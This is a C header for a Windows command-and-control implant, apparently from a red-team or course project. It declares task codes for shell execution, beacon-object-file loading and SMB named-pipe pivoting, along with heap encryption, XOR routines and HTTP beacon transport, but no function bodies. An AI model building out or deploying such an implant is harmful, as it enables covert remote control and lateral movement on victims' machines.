#ifndef INTERNALS_H
#define INTERNALS_H

#include <windows.h>

// Task command IDs - must match the Go plugin on Day 10
#define CMD_EXIT   0x01
#define CMD_SHELL  0x02
#define CMD_PWD    0x03
#define CMD_LS     0x04
#define CMD_BOF    0x05
#define CMD_LINK   0x06
#define CMD_PIVOT  0x07  // parent relays tasks to SMB child (Exchange)

#define PIVOT_RESULT_MAGIC 0x50  // first byte of CMD_PIVOT result back to C2
#define PIVOT_DEAD_MAGIC   0x44  // CMD_PIVOT failed - child pipe broken; payload = [36B child_uuid]
#define EXIT_MAGIC         0x45  // CMD_EXIT confirmation byte sent before TerminateProcess

#define CMD_UNLINK       0x08  // unlink a named-pipe child session by UUID


// Heap subsystem
PVOID Heap_Alloc ( SIZE_T size );
void  Heap_Free  ( PVOID ptr );
void  HeapCrypt  ( ULONG_PTR key );
PVOID Heap_Realloc( PVOID ptr, SIZE_T new_size );

// Memory subsystem
PVOID Mem_Alloc   ( SIZE_T size );
void  Mem_Free    ( PVOID ptr, SIZE_T size );
BOOL  Mem_Protect ( PVOID ptr, SIZE_T size, ULONG protect );

// HTTP Connection
PVOID Http_Open   ( PCHAR user_agent );
PVOID Http_Connect( PVOID h_internet, PCHAR host, UINT16 port );
BOOL  Http_Send   ( PVOID h_connect, PCHAR uri, BOOL use_ssl, PAIN_HEADER* extra_hdrs, UINT32 extra_hdr_count, PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
void  Http_Close  ( PVOID handle );

BOOL Transport_Send    ( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
BOOL Transport_Checkin ();
BOOL Transport_Poll ( PVOID* out_buf, UINT32* out_len );
BOOL Task_Dispatch  ( PVOID buf, UINT32 buf_len );

// SMB child role - named-pipe send/receive (used in place of Transport_Send when SMB profile)
BOOL Smb_Send( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );

// SMB parent relay role - manage connected child pipe sessions
PVOID Smb_Add ( PCHAR pipe_path );            // open child pipe, read checkin, return node
BOOL  Smb_Rm  ( PVOID node );                 // close pipe handle, free node
PVOID Smb_Get ( PCHAR uuid );                 // find node by child UUID
PVOID Smb_List();                             // return head of the linked list

void Beacon_Sleep( ULONG ms );
VOID Malleable_Init();
VOID Config_Smb_Init();

// Crypto subsystem
void Crypt_Xor    ( PVOID buf, SIZE_T size, ULONG_PTR key );
void Crypt_XorKey ( PVOID buf, SIZE_T size, PBYTE key, SIZE_T key_len );

// Wire packet types 
// Growing byte buffer used to build outgoing packets
typedef struct _PACKAGE {
    PVOID  Buffer;   // heap allocation holding the serialized bytes
    SIZE_T Length;   // bytes written so far (= current write position)
    PCHAR  TaskUUID; // UUID of the task this packet answers (can be null for checkin)
} PACKAGE, *PPACKAGE;

// Cursor over a received byte buffer
typedef struct _PARSER {
    PCHAR  Original; // start of the allocation (freed on Destroy)
    PCHAR  Buffer;   // current read cursor
    UINT32 Size;     // total size of the buffer
    UINT32 Length;   // bytes remaining from cursor to end
} PARSER, *PPARSER;

// Package functions 
PPACKAGE Pkg_Create  ( PCHAR agent_id );
void     Pkg_Int32   ( PPACKAGE pkg, INT32 val );
void     Pkg_Int64   ( PPACKAGE pkg, INT64 val );
void     Pkg_Bytes   ( PPACKAGE pkg, PVOID data, UINT32 size );
void     Pkg_Pad     ( PPACKAGE pkg, PVOID data, UINT32 size );
void     Pkg_Str     ( PPACKAGE pkg, PCHAR str );
BOOL     Pkg_Transmit( PPACKAGE pkg, PVOID *response, UINT32 *resp_size );
void     Pkg_Destroy ( PPACKAGE pkg );

// Parser functions
void   Psr_New    ( PPARSER psr, PVOID buf, UINT32 size );
INT32  Psr_Int32  ( PPARSER psr );
PBYTE  Psr_Bytes  ( PPARSER psr, UINT32 *out_size );
PCHAR  Psr_Str    ( PPARSER psr, UINT32 *out_size );
void   Psr_Pad    ( PPARSER psr, UINT32 size );
void   Psr_Destroy( PPARSER psr );

#endif // INTERNALS_H
